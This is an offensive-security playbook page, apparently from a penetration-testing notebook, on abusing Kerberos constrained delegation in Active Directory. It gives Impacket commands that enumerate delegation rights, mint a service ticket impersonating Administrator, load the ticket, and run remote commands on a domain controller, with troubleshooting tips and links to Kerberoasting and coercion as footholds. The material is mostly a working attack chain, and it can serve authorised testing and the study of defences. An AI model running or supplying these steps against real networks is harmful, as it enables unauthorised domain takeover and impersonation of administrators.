# Constrained Delegation

When an account is trusted to request service tickets *on behalf of other users* to a named service, taking control of that account lets you impersonate anyone — the Administrator included — to that one service. The attack is not an exploit: you reach the account, then ask the [[Security-Terms#^kerberos|domain controller]] for a ticket as someone you are not, and it hands it over because the account is configured to be allowed that.

Three configurations wear the word *delegation* and must be kept apart, because the move is different for each:

- **Constrained, with protocol transition** (the flag `TrustedToAuthForDelegation`) → the account can mint a ticket for *any* user with nothing from that user at all. This is the dangerous, easy one: you impersonate the Administrator outright.
- **Constrained, without protocol transition** → you can only forward a ticket a user already sent you. You cannot conjure the Administrator from nothing, so it needs that user to authenticate to you first — harder, and often paired with a coercion step.
- **Unconstrained** → a different technique entirely: the account captures a full ticket from anyone who authenticates to it. Not covered here.

## Find what an account is allowed to delegate to

```bash
impacket-findDelegation 'domain.local/user:password' -dc-ip <dc ip>
```

- read two columns: `DelegationType` and `DelegationRightsTo`. An account you control, typed `Constrained w/ Protocol Transition`, pointing at a useful SPN (Service Principal Name — the label of one service on one host) is the whole game.
- `cifs/<host>` is the one to hope for: CIFS is the file-sharing service, and a ticket to it as the Administrator means file access and command execution on that host.

## Abuse it (with protocol transition)

```bash
impacket-getST -spn cifs/DC01.domain.local -impersonate Administrator 'domain.local/user:password' -dc-ip <dc ip>
```

- `-spn` → must be exactly one of the SPNs `findDelegation` listed for this account. An SPN it is not allowed to delegate to is refused by the controller, which reads like the attack failing when it is really the wrong target.
- `-impersonate Administrator` → the user you become. Protocol transition is what lets this work with no password or ticket of theirs.
- the command writes a ticket file; its exact name is on the `Saving ticket in ...` line.

```bash
export KRB5CCNAME=Administrator@cifs_DC01.domain.local@DOMAIN.LOCAL.ccache
```

- point this at the file `getST` just wrote. Every Kerberos tool reads its ticket from this variable, so a forgotten export means the next tool falls back to asking for a password you do not have.

```bash
impacket-wmiexec -k -no-pass domain.local/Administrator@DC01.domain.local
```

- `-k` → authenticate with the ticket in `KRB5CCNAME`, not a password. `-no-pass` → do not prompt for one.
- the target must be the host's FQDN, never its IP: a Kerberos ticket is named after a host, and an IP forces NTLM instead, for which you hold no hash.

> [!warning]
> `KRB_AP_ERR_SKEW` means your clock is more than five minutes off the controller's — `sudo ntpdate -u <dc ip>` and reissue the ticket. And the ticket is minted for one SPN only: `cifs/<host>` opens files and execution on that host but not, say, its LDAP. Need a different service, reissue `getST` with that SPN.

## Where the account comes from

You almost never start as the delegating account — you arrive at it. A service account cracked through [[Kerberoasting]], or a hash coerced through [[Authentication-Coercion]], is the usual foothold; this technique is what turns that ordinary account into Domain Admin. Back to [[▸ AD-Run-Sheet]] step 5 to spot the delegation in the first place.
